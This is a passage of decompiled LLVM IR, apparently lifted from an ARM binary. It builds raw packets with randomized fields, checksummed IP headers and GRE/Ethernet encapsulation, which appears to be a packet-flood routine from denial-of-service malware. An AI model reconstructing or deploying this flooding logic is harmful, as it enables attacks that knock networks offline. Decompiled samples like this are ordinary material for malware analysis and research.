  store i32 %v0_aae4, i32* %stack_var_-44, align 4
  %v6_aae8 = icmp slt i32 %v1_aad8, %v1_aadc
  br i1 %v6_aae8, label %dec_label_pc_aaec, label %dec_label_pc_aba4

dec_label_pc_aaec:                                ; preds = %bb, %dec_label_pc_a9a4
  store i32 4, i32* %r1.global-to-local, align 4
  store i32 1510, i32* %r0.global-to-local, align 4
  %v2_aaf8 = call i32 @function_13258(i32 1510, i32 4)
  store i32 %v2_aaf8, i32* %r0.global-to-local, align 4
  store i32 %v2_a800, i32* %r2.global-to-local, align 4
  %v3_ab00 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_ab00, i32* %r3.global-to-local, align 4
  %v2_ab04 = load i32, i32* @r4, align 4
  %v5_ab04 = mul i32 %v2_ab04, 4
  %v6_ab04 = add i32 %v5_ab04, %v2_a800
  %v7_ab04 = inttoptr i32 %v6_ab04 to i32*
  store i32 %v2_aaf8, i32* %v7_ab04, align 4
  %v0_ab08 = load i32, i32* %r2.global-to-local, align 4
  %v1_ab08 = load i32, i32* %r3.global-to-local, align 4
  %v4_ab08 = mul i32 %v1_ab08, 4
  %v5_ab08 = add i32 %v4_ab08, %v0_ab08
  %v6_ab08 = inttoptr i32 %v5_ab08 to i32*
  %v7_ab08 = load i32, i32* %v6_ab08, align 4
  store i32 %v7_ab08, i32* %r4.global-to-local, align 4
  %v1_ab0c = inttoptr i32 %v7_ab08 to i8*
  %v2_ab0c = load i8, i8* %v1_ab0c, align 1
  %tmp60 = urem i8 %v2_ab0c, 16
  %v1_ab10 = zext i8 %tmp60 to i32
  %v1_ab14 = or i32 %v1_ab10, 64
  store i32 %v1_ab14, i32* %r2.global-to-local, align 4
  %v1_ab18 = trunc i32 %v1_ab14 to i8
  store i8 %v1_ab18, i8* %v1_ab0c, align 1
  %v0_ab1c = load i32, i32* %r4.global-to-local, align 4
  %v1_ab1c = inttoptr i32 %v0_ab1c to i8*
  %v2_ab1c = load i8, i8* %v1_ab1c, align 1
  %v1_ab20 = and i8 %v2_ab1c, -16
  %v1_ab24 = or i8 %v1_ab20, 5
  store i8 %v1_ab24, i8* %v1_ab1c, align 1
  store i32 %v4_ab2c, i32* %r3.global-to-local, align 4
  %v2_ab30 = load i32, i32* %r4.global-to-local, align 4
  %v3_ab30 = add i32 %v2_ab30, 1
  %v4_ab30 = inttoptr i32 %v3_ab30 to i8*
  store i8 %v5_a838, i8* %v4_ab30, align 1
  store i32 %v3_a9c0, i32* %r0.global-to-local, align 4
  %v1_ab38 = call i32 @function_14898(i32 %v3_a9c0)
  %v2_ab38 = trunc i32 %v1_ab38 to i16
  %v3_ab3c = load i32, i32* %r4.global-to-local, align 4
  %v4_ab3c = add i32 %v3_ab3c, 2
  %v5_ab3c = inttoptr i32 %v4_ab3c to i16*
  store i16 %v2_ab38, i16* %v5_ab3c, align 2
  %v0_ab40 = load i32, i32* @fp, align 4
  store i32 %v0_ab40, i32* %r0.global-to-local, align 4
  %v1_ab44 = call i32 @function_14898(i32 %v0_ab40)
  %v2_ab44 = trunc i32 %v1_ab44 to i16
  store i32 %v1_ab44, i32* %r0.global-to-local, align 4
  store i32 %v1_a880, i32* %r1.global-to-local, align 4
  store i32 %v4_ab4c, i32* %r2.global-to-local, align 4
  store i1 %v2_ab50, i1* %cpsr_z.global-to-local, align 1
  %v3_ab54 = load i32, i32* %r4.global-to-local, align 4
  %v4_ab54 = add i32 %v3_ab54, 4
  %v5_ab54 = inttoptr i32 %v4_ab54 to i16*
  store i16 %v2_ab44, i16* %v5_ab54, align 2
  %v0_ab58 = load i32, i32* %r2.global-to-local, align 4
  %v1_ab58 = trunc i32 %v0_ab58 to i8
  %v2_ab58 = load i32, i32* %r4.global-to-local, align 4
  %v3_ab58 = add i32 %v2_ab58, 8
  %v4_ab58 = inttoptr i32 %v3_ab58 to i8*
  store i8 %v1_ab58, i8* %v4_ab58, align 1
  %v0_ab5c = load i32, i32* %r4.global-to-local, align 4
  %v1_ab5c = add i32 %v0_ab5c, 38
  store i32 %v1_ab5c, i32* @r5, align 4
  %v1_ab60 = add i32 %v0_ab5c, 58
  store i32 %v1_ab60, i32* @r6, align 4
  %v1_ab64 = add i32 %v0_ab5c, 24
  store i32 %v1_ab64, i32* @r7, align 4
  %v1_ab68 = add i32 %v0_ab5c, 20
  store i32 %v1_ab68, i32* @r8, align 4
  %v0_ab6c = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_ab6c, label %dec_label_pc_a9e8, label %dec_label_pc_ab70

dec_label_pc_ab70:                                ; preds = %dec_label_pc_aaec
  store i32 16384, i32* %r0.global-to-local, align 4
  %v1_ab74 = call i32 @function_14898(i32 16384)
  %v2_ab74 = trunc i32 %v1_ab74 to i16
  store i32 %v1_ab74, i32* %r0.global-to-local, align 4
  %v3_ab78 = load i32, i32* %r4.global-to-local, align 4
  %v4_ab78 = add i32 %v3_ab78, 6
  %v5_ab78 = inttoptr i32 %v4_ab78 to i16*
  store i16 %v2_ab74, i16* %v5_ab78, align 2
  %v2_a9ec.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_a9e8

dec_label_pc_ab80:                                ; preds = %dec_label_pc_a9e8
  store i32 16384, i32* %r0.global-to-local, align 4
  %v1_ab84 = call i32 @function_14898(i32 16384)
  %v2_ab84 = trunc i32 %v1_ab84 to i16
  store i32 %v1_ab84, i32* %r0.global-to-local, align 4
  %v3_ab88 = load i32, i32* @r5, align 4
  %v4_ab88 = add i32 %v3_ab88, 6
  %v5_ab88 = inttoptr i32 %v4_ab88 to i16*
  store i16 %v2_ab84, i16* %v5_ab88, align 2
  br label %dec_label_pc_aa88

dec_label_pc_ab90:                                ; preds = %dec_label_pc_a944
  store i32 %v3_a934, i32* @r0, align 4
  %v1_ab94 = call i32 @function_15b6c(i32 %v3_a934)
  store i32 %v1_ab94, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_ab98

dec_label_pc_ab98:                                ; preds = %dec_label_pc_a7e4, %dec_label_pc_ab90
  %v1_aba0 = phi i32 [ %v3_a934, %dec_label_pc_a7e4 ], [ %v1_ab94, %dec_label_pc_ab90 ]
  store i32 %v3_a7e4, i32* %r4.global-to-local, align 4
  store i32 %v24_a7e4, i32* %fp.global-to-local, align 4
  ret i32 %v1_aba0

dec_label_pc_aba4:                                ; preds = %bb
  %v1_abac = add i32 %v5_a8cc, 8
  store i32 %v1_abac, i32* %r3.global-to-local, align 4
  %v1_abb0 = add i32 %v5_a8cc, 66
  store i32 %v1_abb0, i32* %r1.global-to-local, align 4
  %v0_abc0.pre.pre = load i32, i32* @sl, align 4
  br label %dec_label_pc_abbc.preheader

dec_label_pc_abbc.preheader:                      ; preds = %dec_label_pc_aba4, %dec_label_pc_ae20
  %v0_abc0.pre = phi i32 [ %v0_abc0.pre.pre, %dec_label_pc_aba4 ], [ 0, %dec_label_pc_ae20 ]
  %stack_var_-120.0.ph = phi i32 [ %v1_abb0, %dec_label_pc_aba4 ], [ %v1_ae2c, %dec_label_pc_ae20 ]
  %stack_var_-124.0.ph = phi i32 [ %v1_abac, %dec_label_pc_aba4 ], [ %v1_ae28, %dec_label_pc_ae20 ]
  %v3_ad88 = icmp eq i32 %v5_a920, -1
  %v8_ad88 = icmp eq i32 %v5_a920, -1
  %v2_adf0 = icmp eq i32 %v1_a984, 0
  %v2_ac58 = ptrtoint i32* %stack_var_-48 to i32
  %v2_ac70 = ptrtoint i32* %stack_var_-52 to i32
  %v2_ac80 = ptrtoint i32* %stack_var_-56 to i32
  %v2_ac90 = ptrtoint i32* %stack_var_-54 to i32
  %v2_aca0 = icmp eq i32 %v1_a8ec, 0
  br label %dec_label_pc_abbc

dec_label_pc_abbc:                                ; preds = %dec_label_pc_abbc, %dec_label_pc_aca8, %dec_label_pc_abbc.preheader
  %v0_abc0 = phi i32 [ %v0_abc0.pre, %dec_label_pc_abbc.preheader ], [ 0, %dec_label_pc_abbc ], [ %v1_ad48, %dec_label_pc_aca8 ]
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_abc0 = icmp eq i32 %v0_abc0, 0
  store i1 %v2_abc0, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %stack_var_-44, align 4
  br i1 %v2_abc0, label %dec_label_pc_abbc, label %dec_label_pc_abcc

dec_label_pc_abcc:                                ; preds = %dec_label_pc_abbc
  store i32 0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_abd0

dec_label_pc_abd0:                                ; preds = %dec_label_pc_aca8, %dec_label_pc_abcc
  %v1_abe4 = phi i32 [ %v1_ad44, %dec_label_pc_aca8 ], [ 0, %dec_label_pc_abcc ]
  %v5_abd4 = mul i32 %v1_abe4, 24
  %v1_abd8 = load i32, i32* @sb, align 4
  %v2_abd8 = add i32 %v1_abd8, %v5_abd4
  store i32 %v2_abd8, i32* %r3.global-to-local, align 4
  store i32 %v2_a800, i32* %r1.global-to-local, align 4
  %v1_abe0 = add i32 %v2_abd8, 20
  %v2_abe0 = inttoptr i32 %v1_abe0 to i8*
  %v3_abe0 = load i8, i8* %v2_abe0, align 1
  %v4_abe0 = zext i8 %v3_abe0 to i32
  store i32 %v4_abe0, i32* %r2.global-to-local, align 4
  %v4_abe4 = mul i32 %v1_abe4, 4
  %v5_abe4 = add i32 %v4_abe4, %v2_a800
  %v6_abe4 = inttoptr i32 %v5_abe4 to i32*
  %v7_abe4 = load i32, i32* %v6_abe4, align 4
  store i32 %v7_abe4, i32* @r5, align 4
  %v7_abe8 = icmp eq i8 %v3_abe0, 31
  store i1 %v7_abe8, i1* %cpsr_z.global-to-local, align 1
  %v1_abec = add i32 %v7_abe4, 24
  store i32 %v1_abec, i32* @r7, align 4
  %v1_abf0 = add i32 %v7_abe4, 38
  store i32 %v1_abf0, i32* @r6, align 4
  %v1_abf4 = add i32 %v7_abe4, 58
  store i32 %v1_abf4, i32* @r8, align 4
  %tmp61 = icmp ult i8 %v3_abe0, 32
  br i1 %tmp61, label %dec_label_pc_ad58, label %dec_label_pc_abfc

dec_label_pc_abfc:                                ; preds = %dec_label_pc_abd0
  store i32 %v5_a920, i32* %r2.global-to-local, align 4
  store i1 %v8_ad88, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_ad88, label %dec_label_pc_ad94, label %dec_label_pc_ac08

dec_label_pc_ac08:                                ; preds = %dec_label_pc_ad58, %dec_label_pc_abfc
  store i32 65535, i32* @r4, align 4
  %v0_ac10 = load i32, i32* @fp, align 4
  %v9_ac10 = icmp eq i32 %v0_ac10, 65535
  store i1 %v9_ac10, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_ac10, label %dec_label_pc_adac, label %dec_label_pc_ac18

dec_label_pc_ac18:                                ; preds = %dec_label_pc_ad94.dec_label_pc_ac18_crit_edge, %dec_label_pc_ac08
  %v1_ac1c = phi i32 [ %v1_ac1c.pre, %dec_label_pc_ad94.dec_label_pc_ac18_crit_edge ], [ 65535, %dec_label_pc_ac08 ]
  store i32 %v3_a97c, i32* %r3.global-to-local, align 4
  %v9_ac1c = icmp eq i32 %v3_a97c, %v1_ac1c
  store i1 %v9_ac1c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_ac1c, label %dec_label_pc_add4, label %dec_label_pc_ac24

dec_label_pc_ac24:                                ; preds = %dec_label_pc_adac, %dec_label_pc_ac18
  %v1_ac28 = phi i32 [ %v1_adcc, %dec_label_pc_adac ], [ %v1_ac1c, %dec_label_pc_ac18 ]
  store i32 %v3_a980, i32* %r1.global-to-local, align 4
  %v9_ac28 = icmp eq i32 %v3_a980, %v1_ac28
  store i1 %v9_ac28, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_ac28, label %dec_label_pc_ade8, label %dec_label_pc_ac30

dec_label_pc_ac30:                                ; preds = %dec_label_pc_add4, %dec_label_pc_ac24
  store i32 %v1_a984, i32* %r2.global-to-local, align 4
  store i1 %v2_adf0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_adf0, label %dec_label_pc_ae04, label %.thread4

.thread4:                                         ; preds = %dec_label_pc_ac30
  %v1_ac38 = load i32, i32* @r5, align 4
  %v2_ac38 = add i32 %v1_ac38, 16
  %v3_ac38 = inttoptr i32 %v2_ac38 to i32*
  %v4_ac38 = load i32, i32* %v3_ac38, align 4
  store i32 %v4_ac38, i32* %r3.global-to-local, align 4
  %v2_ac3c = load i32, i32* @r6, align 4
  %v3_ac3c = add i32 %v2_ac3c, 16
  %v4_ac3c = inttoptr i32 %v3_ac3c to i32*
  store i32 %v4_ac38, i32* %v4_ac3c, align 4
  br label %dec_label_pc_ac44

dec_label_pc_ac44:                                ; preds = %bb58, %.thread4, %dec_label_pc_ae04
  %v0_ac44 = call i32 @function_f570()
  store i32 %v0_ac44, i32* %r0.global-to-local, align 4
  store i32 %v0_ac44, i32* %stack_var_-48, align 4
  %v0_ac4c = call i32 @function_f570()
  store i32 %v0_ac4c, i32* %r0.global-to-local, align 4
  store i32 %v0_ac4c, i32* %stack_var_-52, align 4
  %v0_ac54 = call i32 @function_f570()
  store i32 %v2_ac58, i32* %r1.global-to-local, align 4
  store i32 %v0_ac54, i32* %stack_var_-56, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  %v0_ac64 = load i32, i32* @r7, align 4
  store i32 %v0_ac64, i32* %r0.global-to-local, align 4
  %v3_ac68 = call i32 @function_123e0(i32 %v0_ac64, i32 %v2_ac58, i32 4)
  %v0_ac6c = load i32, i32* @r7, align 4
  %v1_ac6c = add i32 %v0_ac6c, 6
  store i32 %v1_ac6c, i32* %r0.global-to-local, align 4
  store i32 %v2_ac70, i32* %r1.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  %v3_ac78 = call i32 @function_123e0(i32 %v1_ac6c, i32 %v2_ac70, i32 4)
  %v0_ac7c = load i32, i32* @r7, align 4
  %v1_ac7c = add i32 %v0_ac7c, 4
  store i32 %v1_ac7c, i32* %r0.global-to-local, align 4
  store i32 %v2_ac80, i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  %v3_ac88 = call i32 @function_123e0(i32 %v1_ac7c, i32 %v2_ac80, i32 2)
  %v0_ac8c = load i32, i32* @r7, align 4
  %v1_ac8c = add i32 %v0_ac8c, 10
  store i32 %v1_ac8c, i32* %r0.global-to-local, align 4
  store i32 %v2_ac90, i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  %v3_ac98 = call i32 @function_123e0(i32 %v1_ac8c, i32 %v2_ac90, i32 2)
  store i32 %v3_ac98, i32* %r0.global-to-local, align 4
  store i32 %v1_a8ec, i32* %r3.global-to-local, align 4
  store i1 %v2_aca0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_aca0, label %dec_label_pc_aca8, label %dec_label_pc_ae10

dec_label_pc_aca8:                                ; preds = %dec_label_pc_ac44, %dec_label_pc_ae10
  %v2_acac = load i32, i32* @r5, align 4
  %v3_acac = add i32 %v2_acac, 10
  %v4_acac = inttoptr i32 %v3_acac to i16*
  store i16 0, i16* %v4_acac, align 2
  %v0_acb0 = load i32, i32* @r5, align 4
  store i32 %v0_acb0, i32* @r0, align 4
  store i32 20, i32* %r1.global-to-local, align 4
  %v2_acb8 = call i32 @function_dadc(i32 %v0_acb0, i32 20)
  %v3_acb8 = trunc i32 %v2_acb8 to i16
  store i32 0, i32* %r2.global-to-local, align 4
  %v3_acc0 = load i32, i32* @r5, align 4
  %v4_acc0 = add i32 %v3_acc0, 10
  %v5_acc0 = inttoptr i32 %v4_acc0 to i16*
  store i16 %v3_acb8, i16* %v5_acc0, align 2
  store i32 20, i32* %r1.global-to-local, align 4
  %v0_acc8 = load i32, i32* %r2.global-to-local, align 4
  %v1_acc8 = trunc i32 %v0_acc8 to i16
  %v2_acc8 = load i32, i32* @r6, align 4
  %v3_acc8 = add i32 %v2_acc8, 10
  %v4_acc8 = inttoptr i32 %v3_acc8 to i16*
  store i16 %v1_acc8, i16* %v4_acc8, align 2
  %v0_accc = load i32, i32* @r6, align 4
  store i32 %v0_accc, i32* @r0, align 4
  %v2_acd0 = call i32 @function_dadc(i32 %v0_accc, i32 20)
  %v3_acd0 = trunc i32 %v2_acd0 to i16
  store i32 %v2_acd0, i32* %r0.global-to-local, align 4
  %v3_acd4 = load i32, i32* @r6, align 4
  %v4_acd4 = add i32 %v3_acd4, 10
  %v5_acd4 = inttoptr i32 %v4_acd4 to i16*
  store i16 %v3_acd0, i16* %v5_acd4, align 2
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_acdc = load i32, i32* @r8, align 4
  %v3_acdc = add i32 %v2_acdc, 6
  %v4_acdc = inttoptr i32 %v3_acdc to i16*
  store i16 0, i16* %v4_acdc, align 2
  %v0_ace0 = load i32, i32* @r8, align 4
  store i32 %v0_ace0, i32* @r1, align 4
  %v1_ace4 = add i32 %v0_ace0, 4
  %v2_ace4 = inttoptr i32 %v1_ace4 to i16*
  %v3_ace4 = load i16, i16* %v2_ace4, align 2
  %v4_ace4 = zext i16 %v3_ace4 to i32
  store i32 %v4_ace4, i32* %r2.global-to-local, align 4
  store i32 %stack_var_-124.0.ph, i32* %r3.global-to-local, align 4
  %v0_acec = load i32, i32* @r6, align 4
  store i32 %v0_acec, i32* %r0.global-to-local, align 4
  %v4_acf0 = call i32 @function_db2c(i32 %v0_acec, i32 %v0_ace0, i32 %v4_ace4, i32 %stack_var_-124.0.ph)
  %v5_acf0 = trunc i32 %v4_acf0 to i16
  store i32 %v4_acf0, i32* %r0.global-to-local, align 4
  %v3_acf4 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_acf4, i32* %r2.global-to-local, align 4
  %v3_acf8 = mul i32 %v3_acf4, 32
  store i32 %v3_acf8, i32* %r3.global-to-local, align 4
  %v0_acfc = load i32, i32* @r5, align 4
  %v1_acfc = add i32 %v0_acfc, 16
  %v2_acfc = inttoptr i32 %v1_acfc to i32*
  %v3_acfc = load i32, i32* %v2_acfc, align 4
  %v5_ad00 = mul i32 %v3_acf4, 24
  store i32 %v5_ad00, i32* %r3.global-to-local, align 4
  %v1_ad04 = load i32, i32* @sb, align 4
  %v2_ad04 = add i32 %v1_ad04, %v5_ad00
  store i32 %v2_ad04, i32* @lr, align 4
  %v2_ad08 = add i32 %v2_ad04, 4
  %v3_ad08 = inttoptr i32 %v2_ad08 to i32*
  store i32 %v3_acfc, i32* %v3_ad08, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 2, i32* %r1.global-to-local, align 4
  %v3_ad14 = load i32, i32* @r8, align 4
  %v4_ad14 = add i32 %v3_ad14, 6
  %v5_ad14 = inttoptr i32 %v4_ad14 to i16*
  store i16 %v5_acf0, i16* %v5_ad14, align 2
  %v0_ad1c = load i32, i32* %r1.global-to-local, align 4
  %v1_ad1c = trunc i32 %v0_ad1c to i16
  %v2_ad1c = load i32, i32* %r3.global-to-local, align 4
  %v3_ad1c = load i32, i32* @sb, align 4
  %v4_ad1c = add i32 %v3_ad1c, %v2_ad1c
  %v5_ad1c = inttoptr i32 %v4_ad1c to i16*
  store i16 %v1_ad1c, i16* %v5_ad1c, align 2
  %v0_ad20 = load i32, i32* %r2.global-to-local, align 4
  %v1_ad20 = trunc i32 %v0_ad20 to i16
  %v2_ad20 = load i32, i32* @lr, align 4
  %v3_ad20 = add i32 %v2_ad20, 2
  %v4_ad20 = inttoptr i32 %v3_ad20 to i16*
  store i16 %v1_ad20, i16* %v4_ad20, align 2
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_ad28 = load i32, i32* @r5, align 4
  store i32 %v0_ad28, i32* @r1, align 4
  store i32 %v3_a934, i32* @r0, align 4
  store i32 %stack_var_-120.0.ph, i32* @r2, align 4
  %v0_ad3c = call i32 @function_14ae4()
  %v3_ad40 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_ad40, i32* %r3.global-to-local, align 4
  %v1_ad44 = add i32 %v3_ad40, 1
  store i32 %v1_ad44, i32* %r0.global-to-local, align 4
  %v1_ad48 = load i32, i32* @sl, align 4
  %v9_ad48 = icmp eq i32 %v1_ad44, %v1_ad48
  store i1 %v9_ad48, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_ad44, i32* %stack_var_-44, align 4
  %v6_ad50 = icmp slt i32 %v1_ad44, %v1_ad48
  br i1 %v6_ad50, label %dec_label_pc_abd0, label %dec_label_pc_abbc

dec_label_pc_ad58:                                ; preds = %dec_label_pc_abd0
  %v1_ad58 = add i32 %v2_abd8, 16
  %v2_ad58 = inttoptr i32 %v1_ad58 to i32*
  %v3_ad58 = load i32, i32* %v2_ad58, align 4
  store i32 %v3_ad58, i32* %r0.global-to-local, align 4
  %v1_ad5c = call i32 @function_14a1c(i32 %v3_ad58)
  store i32 %v1_ad5c, i32* %r0.global-to-local, align 4
  store i32 %v1_ad5c, i32* %r4.global-to-local, align 4
  %v0_ad64 = call i32 @function_f570()
  store i32 %v0_ad64, i32* %r0.global-to-local, align 4
  %v3_ad68 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_ad68, i32* %r2.global-to-local, align 4
  %v5_ad70 = mul i32 %v3_ad68, 24
  %v1_ad74 = load i32, i32* @sb, align 4
  %v2_ad74 = add i32 %v1_ad74, %v5_ad70
  store i32 %v2_ad74, i32* %r3.global-to-local, align 4
  %v1_ad78 = add i32 %v2_ad74, 20
  %v2_ad78 = inttoptr i32 %v1_ad78 to i8*
  %v3_ad78 = load i8, i8* %v2_ad78, align 1
  %v4_ad78 = zext i8 %v3_ad78 to i32
  store i32 %v4_ad78, i32* %r2.global-to-local, align 4
  %v0_ad7c = load i32, i32* %r4.global-to-local, align 4
  %v7_ad7c = lshr i32 %v0_ad64, %v4_ad78
  %v8_ad7c = add i32 %v7_ad7c, %v0_ad7c
  store i32 %v8_ad7c, i32* %r0.global-to-local, align 4
  %v1_ad80 = call i32 @function_14874(i32 %v8_ad7c)
  store i32 %v1_ad80, i32* %r0.global-to-local, align 4
  store i32 %v5_a920, i32* %r2.global-to-local, align 4
  store i1 %v8_ad88, i1* %cpsr_z.global-to-local, align 1
  %v1_ad8c = load i32, i32* @r5, align 4
  %v2_ad8c = add i32 %v1_ad8c, 16
  %v3_ad8c = inttoptr i32 %v2_ad8c to i32*
  store i32 %v1_ad80, i32* %v3_ad8c, align 4
  br i1 %v3_ad88, label %dec_label_pc_ad94, label %dec_label_pc_ac08

dec_label_pc_ad94:                                ; preds = %dec_label_pc_ad58, %dec_label_pc_abfc
  %v0_ad94 = call i32 @function_f570()
  store i32 %v0_ad94, i32* %r0.global-to-local, align 4
  store i32 65535, i32* @r4, align 4
  %v0_ada0 = load i32, i32* @fp, align 4
  %v9_ada0 = icmp eq i32 %v0_ada0, 65535
  store i1 %v9_ada0, i1* %cpsr_z.global-to-local, align 1
  %v1_ada4 = load i32, i32* @r5, align 4
  %v2_ada4 = add i32 %v1_ada4, 12
  %v3_ada4 = inttoptr i32 %v2_ada4 to i32*
  store i32 %v0_ad94, i32* %v3_ada4, align 4
  br i1 %v9_ada0, label %dec_label_pc_adac, label %dec_label_pc_ad94.dec_label_pc_ac18_crit_edge

dec_label_pc_ad94.dec_label_pc_ac18_crit_edge:    ; preds = %dec_label_pc_ad94
  %v1_ac1c.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_ac18

dec_label_pc_adac:                                ; preds = %dec_label_pc_ad94, %dec_label_pc_ac08
  %v0_adac = call i32 @function_f570()
  %v3_adb4 = urem i32 %v0_adac, 65536
  store i32 %v3_adb4, i32* %r0.global-to-local, align 4
  %v1_adbc = sub nsw i32 999, %v3_adb4
  store i32 %v1_adbc, i32* %r3.global-to-local, align 4
  %v1_adc0 = trunc i32 %v0_adac to i16
  %v2_adc0 = load i32, i32* @r5, align 4
  %v3_adc0 = add i32 %v2_adc0, 4
  %v4_adc0 = inttoptr i32 %v3_adc0 to i16*
  store i16 %v1_adc0, i16* %v4_adc0, align 2
  %v0_adc4 = load i32, i32* %r3.global-to-local, align 4
  %v1_adc4 = trunc i32 %v0_adc4 to i16
  %v2_adc4 = load i32, i32* @r6, align 4
  %v3_adc4 = add i32 %v2_adc4, 4
  %v4_adc4 = inttoptr i32 %v3_adc4 to i16*
  store i16 %v1_adc4, i16* %v4_adc4, align 2
  store i32 %v3_a97c, i32* %r3.global-to-local, align 4
  %v1_adcc = load i32, i32* @r4, align 4
  %v9_adcc = icmp eq i32 %v3_a97c, %v1_adcc
  store i1 %v9_adcc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_adcc, label %dec_label_pc_add4, label %dec_label_pc_ac24

dec_label_pc_add4:                                ; preds = %dec_label_pc_adac, %dec_label_pc_ac18
  %v0_add4 = call i32 @function_f570()
  %v1_add4 = trunc i32 %v0_add4 to i16
  store i32 %v0_add4, i32* %r0.global-to-local, align 4
  store i32 %v3_a980, i32* %r1.global-to-local, align 4
  %v1_addc = load i32, i32* @r4, align 4
  %v9_addc = icmp eq i32 %v3_a980, %v1_addc
  store i1 %v9_addc, i1* %cpsr_z.global-to-local, align 1
  %v3_ade0 = load i32, i32* @r5, align 4
  %v4_ade0 = add i32 %v3_ade0, 58
  %v5_ade0 = inttoptr i32 %v4_ade0 to i16*
  store i16 %v1_add4, i16* %v5_ade0, align 2
  br i1 %v9_addc, label %dec_label_pc_ade8, label %dec_label_pc_ac30

dec_label_pc_ade8:                                ; preds = %dec_label_pc_add4, %dec_label_pc_ac24
  %v0_ade8 = call i32 @function_f570()
  %v1_ade8 = trunc i32 %v0_ade8 to i16
  store i32 %v0_ade8, i32* %r0.global-to-local, align 4
  store i32 %v1_a984, i32* %r2.global-to-local, align 4
  store i1 %v2_adf0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_adf0, label %.thread18, label %bb58

.thread18:                                        ; preds = %dec_label_pc_ade8
  %v3_adf819 = load i32, i32* @r8, align 4
  %v4_adf820 = add i32 %v3_adf819, 2
  %v5_adf821 = inttoptr i32 %v4_adf820 to i16*
  store i16 %v1_ade8, i16* %v5_adf821, align 2
  br label %dec_label_pc_ae04

bb58:                                             ; preds = %dec_label_pc_ade8
  %v1_adf4 = load i32, i32* @r5, align 4
  %v2_adf4 = add i32 %v1_adf4, 16
  %v3_adf4 = inttoptr i32 %v2_adf4 to i32*
  %v4_adf4 = load i32, i32* %v3_adf4, align 4
  store i32 %v4_adf4, i32* %r3.global-to-local, align 4
  %v3_adf8 = load i32, i32* @r8, align 4
  %v4_adf8 = add i32 %v3_adf8, 2
  %v5_adf8 = inttoptr i32 %v4_adf8 to i16*
  store i16 %v1_ade8, i16* %v5_adf8, align 2
  %v1_adfc = load i32, i32* %r3.global-to-local, align 4
  %v2_adfc = load i32, i32* @r6, align 4
  %v3_adfc = add i32 %v2_adfc, 16
  %v4_adfc = inttoptr i32 %v3_adfc to i32*
  store i32 %v1_adfc, i32* %v4_adfc, align 4
  br label %dec_label_pc_ac44

dec_label_pc_ae04:                                ; preds = %.thread18, %dec_label_pc_ac30
  %v0_ae04 = call i32 @function_f570()
  store i32 %v0_ae04, i32* %r0.global-to-local, align 4
  %v1_ae08 = load i32, i32* @r6, align 4
  %v2_ae08 = add i32 %v1_ae08, 16
  %v3_ae08 = inttoptr i32 %v2_ae08 to i32*
  store i32 %v0_ae04, i32* %v3_ae08, align 4
  br label %dec_label_pc_ac44

dec_label_pc_ae10:                                ; preds = %dec_label_pc_ac44
  %v0_ae10 = load i32, i32* @r8, align 4
  %v1_ae10 = add i32 %v0_ae10, 8
  store i32 %v1_ae10, i32* %r0.global-to-local, align 4
  store i32 %v5_a8cc, i32* %r1.global-to-local, align 4
  %v2_ae18 = inttoptr i32 %v1_ae10 to i16*
  %v3_ae18 = call i32 @function_f770(i16* %v2_ae18, i32 %v5_a8cc)
  store i32 %v3_ae18, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_aca8

dec_label_pc_ae20:                                ; preds = %dec_label_pc_a96c
  %v1_ae28 = add i32 %v5_a8cc, 8
  store i32 %v1_ae28, i32* %r2.global-to-local, align 4
  %v1_ae2c = add i32 %v5_a8cc, 66
  store i32 %v1_ae2c, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_abbc.preheader

; uselistorder directives
  uselistorder i32 %v1_ae2c, { 1, 0 }
  uselistorder i32 %v1_ae28, { 1, 0 }
  uselistorder i16 %v1_ade8, { 1, 0 }
  uselistorder i32 %v0_ade8, { 1, 0 }
  uselistorder i32 %v0_add4, { 1, 0 }
  uselistorder i32 %v1_adcc, { 1, 0 }
  uselistorder i32 %v3_adb4, { 1, 0 }
  uselistorder i32 %v0_adac, { 1, 0 }
  uselistorder i32 %v1_ad48, { 1, 2, 0 }
  uselistorder i32 %v1_ad44, { 2, 0, 3, 4, 1 }
  uselistorder i32 %v3_acf4, { 1, 0, 2 }
  uselistorder i32 %v4_acf0, { 1, 0 }
  uselistorder i32 %v2_acd0, { 1, 0 }
  uselistorder i32 %v7_abe4, { 2, 1, 0, 3 }
  uselistorder i1 %v2_adf0, { 2, 3, 1, 0 }
  uselistorder i32 %v1_ab84, { 1, 0 }
  uselistorder i32 %v1_ab74, { 1, 0 }
  uselistorder i32 %v0_ab5c, { 1, 2, 3, 4, 0 }
  uselistorder i32 %v1_ab44, { 1, 0 }
  uselistorder i32 %v1_aad0, { 1, 0 }
  uselistorder i32 %v0_aa90, { 1, 0, 2 }
  uselistorder i32 %v1_aa6c, { 1, 0 }
  uselistorder i32 %v4_aa28, { 1, 0 }
  uselistorder i32 %v1_aa24, { 0, 2, 1 }
  uselistorder i32 %v4_ab4c, { 1, 0 }
  uselistorder i1 %v2_ab50, { 1, 0 }
  uselistorder i32 %v4_ab2c, { 1, 0 }
  uselistorder i32 %v3_a9cc, { 2, 1, 0 }
